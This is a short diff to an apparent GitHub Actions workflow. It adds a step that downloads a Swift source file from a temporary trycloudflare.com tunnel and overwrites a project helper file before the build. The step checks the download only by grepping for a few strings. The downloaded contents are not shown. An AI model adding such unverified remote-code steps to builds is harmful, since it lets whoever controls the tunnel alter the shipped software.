@@ -13,6 +13,15 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
+      - name: Inject custom remote PatchProjectStore
+        run: |
+          set -e
+          curl -fsSL -o ThreeOneOSFive/helpers/PatchProjectStore.swift \
+            "https://importantly-finally-curtis-brakes.trycloudflare.com/uploads/PatchProjectStore.swift"
+          wc -c ThreeOneOSFive/helpers/PatchProjectStore.swift
+          grep -n "RemotePatchConfiguration" ThreeOneOSFive/helpers/PatchProjectStore.swift | head -5
+          grep -n "trycloudflare\|custom-2026\|removeRemotePackagesNotInFeed" ThreeOneOSFive/helpers/PatchProjectStore.swift | head -10
+
       - name: Show build tools
         run: |
           xcodebuild -version
